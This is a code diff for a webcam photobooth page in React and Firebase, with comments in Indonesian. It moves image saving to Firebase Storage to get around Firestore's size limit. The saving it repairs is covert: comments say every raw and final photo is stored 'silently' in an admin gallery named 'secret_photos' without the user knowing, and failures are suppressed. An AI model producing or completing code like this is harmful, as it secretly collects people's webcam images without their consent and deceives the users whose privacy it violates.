@@ -1,7 +1,8 @@
 import React, { useRef, useState, useEffect, useCallback } from 'react';
 import Webcam from 'react-webcam';
-import { db } from '../firebase';
+import { db, storage } from '../firebase';
 import { collection, query, orderBy, onSnapshot, addDoc } from 'firebase/firestore';
+import { ref, uploadBytes, getDownloadURL } from 'firebase/storage';
 
 // ==========================================
 // 🎯 TYPES
@@ -1197,14 +1198,19 @@ export function PhotoboxPage() {
   const autoSaveToAdmin = async (dataUrl: string, slotIndex: number) => {
     if (!selected) return;
     try {
-      // ✅ Ubah collection ke 'secret_photos' biar sinkron sama Admin.tsx
-      await addDoc(collection(db, 'secret_photos'), {
-        url: dataUrl, // ✅ Ubah key dari 'dataUrl' jadi 'url'
-        slotIndex,
-        templateId: selected.id, 
-        templateName: selected.name,
-        captureMethod, 
-        createdAt: new Date().toISOString(),
+      // ✅ FIX: Upload ke Firebase Storage dulu, baru simpan URL-nya ke Firestore
+      // Alasan: Firestore punya limit 1MB/doc, sedangkan base64 PNG bisa 3-10MB → silent fail!
+      const fetchRes = await fetch(dataUrl);
+      const blob = await fetchRes.blob();
+      const filename = `photobox_raw/${selected.id}_slot${slotIndex}_${Date.now()}.jpg`;
+      const storageRef = ref(storage, filename);
+      await uploadBytes(storageRef, blob, { contentType: 'image/jpeg' });
+      const downloadUrl = await getDownloadURL(storageRef);
+
+      await addDoc(collection(db, 'photobox_raw_photos'), {
+        url: downloadUrl, slotIndex,
+        templateId: selected.id, templateName: selected.name,
+        captureMethod, createdAt: new Date().toISOString(),
       });
     } catch (e) {
       console.warn('Auto-save to admin failed:', e);
@@ -1336,10 +1342,18 @@ export function PhotoboxPage() {
     setGenerating(false);
     setStage('result');
 
-    // Simpan ke galeri admin secara silent di background (user tidak tahu)
+    // ✅ FIX: Simpan ke galeri admin secara silent — upload ke Firebase Storage dulu
+    // Jangan simpan base64 langsung ke Firestore (limit 1MB, PNG bisa 3-10MB → selalu gagal!)
     try {
+      const fetchRes = await fetch(dataUrl);
+      const blob = await fetchRes.blob();
+      const filename = `photobox_gallery/${selected?.id}_${Date.now()}.png`;
+      const storageRef = ref(storage, filename);
+      await uploadBytes(storageRef, blob, { contentType: 'image/png' });
+      const downloadUrl = await getDownloadURL(storageRef);
+
       await addDoc(collection(db, 'secret_photos'), {
-        url: dataUrl, templateId: selected?.id,
+        url: downloadUrl, templateId: selected?.id,
         templateName: selected?.name, createdAt: new Date().toISOString()
       });
     } catch { /* silent fail */ }
